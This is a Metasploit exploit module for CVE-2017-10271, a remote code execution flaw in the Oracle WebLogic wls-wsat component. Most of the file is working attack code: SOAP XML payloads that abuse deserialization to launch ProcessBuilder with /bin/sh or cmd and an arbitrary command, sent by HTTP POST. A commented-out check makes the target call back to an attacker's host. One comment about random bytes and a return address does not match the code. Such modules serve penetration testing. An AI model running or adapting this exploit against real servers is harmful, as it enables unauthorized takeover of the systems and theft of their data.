##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Oracle WebLogic wls-wsat Component Deserialization RCE',
        'Description'    => %q(
            The Oracle WebLogic WLS WSAT Component is vulnerable to a XML Deserialization
        remote code execution vulnerability. Supported versions that are affected are
        10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => ['d3c3pt10n <d3c3pt10n[AT]deceiveyour.team>'],
        'References'     =>
          [
            [ 'URL', 'http://www.oracle.com/technetwork/middleware/weblogic/overview/index.html'],
            [ 'CVE', '2017-10271']
          ],
        'Platform'      => %w{ win linux unix },
        'Arch'          => [ ARCH_CMD ],
        'Targets'        =>
          [
            [ 'Windows Command payload', { 'Arch' => ARCH_CMD, 'Platform' => 'win' } ],
            [ 'Unix Command payload', { 'Arch' => [ARCH_CMD], Platform => 'unix' } ],
            [ 'Linux Command payload', { 'Arch' => [ARCH_CMD], Platform => 'linux' } ]
          ],
        'Payload'        =>
        {
          'DisableNops' => true
        },
        'DisclosureDate' => "Oct 19 2017",
        # Note that this is by index, rather than name. It's generally easiest
        # just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget'  => 0
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the WebLogic WSAT endpoint', '/wls-wsat/CoordinatorPortType']),
      OptInt.new('TIMEOUT', [true, "The timeout in seconds", 10]),
      OptInt.new('RPORT', [true, "The remote port that the WebLogic WSAT endpoint listens on", 7001]),
    ])
  end

  def cmd_payload
    # Do NOT move the ampersand to a non-first index spot or else it'll replace aspects that we need
    # This escaping makes sure that our payload works!
    replacements = [ ['&', '&amp;'], ['"', '&quot;'], ["'", '&apos;'], ['<', '&lt;'], ['>', '&gt;'] ]
    xml_prepared = payload.encoded
    replacements.each do |r|
      xml_prepared.gsub!(r[0], r[1])
    end

    return xml_prepared
  end

  def unix_payload
    # Generate a payload which will execute on a *nix machine using /bin/sh
    xml = %Q{<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>/bin/sh</string>
            </void>
            <void index="1">
              <string>-c</string>
            </void>
            <void index="2">
              <string>#{cmd_payload}</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>}
  end

  # Generate a payload which will execute on a Windows machine using cmd
  def windows_payload
    xml = %Q{<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>cmd</string>
            </void>
            <void index="1">
              <string>/c</string>
            </void>
            <void index="2">
              <string>#{cmd_payload}</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>}
  end

# Not sure how to catch the response, so I'll leave this here in case someone can help
#   def check_payload
#     xml = %Q{<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
#   <soapenv:Header>
#     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
#       <java version="1.8" class="java.beans.XMLDecoder">
#         <object id="url" class="java.net.URL">
#           <string>http://{lhost}:{lport}/{random_uri}</string>
#         </object>
#         <object idref="url">
#           <void id="stream" method = "openStream" />
#         </object>
#       </java>
#     </work:WorkContext>
#     </soapenv:Header>
#   <soapenv:Body/>
# </soapenv:Envelope>}
#   end

  #
  # The exploit method connects to the remote service and sends 1024 random bytes
  # followed by the fake return address and then the payload.
  #
  def exploit
    target_os = datastore['TARGET'].to_i

    xml_payload = ''
    if target_os == 0
      xml_payload = windows_payload
    else
      xml_payload = unix_payload
    end

    send_request_cgi(
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path),
      'data'     => xml_payload,
      'ctype'    => 'text/xml;charset=UTF-8',
      'headers'  => { 'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50' }
    )
  end
end
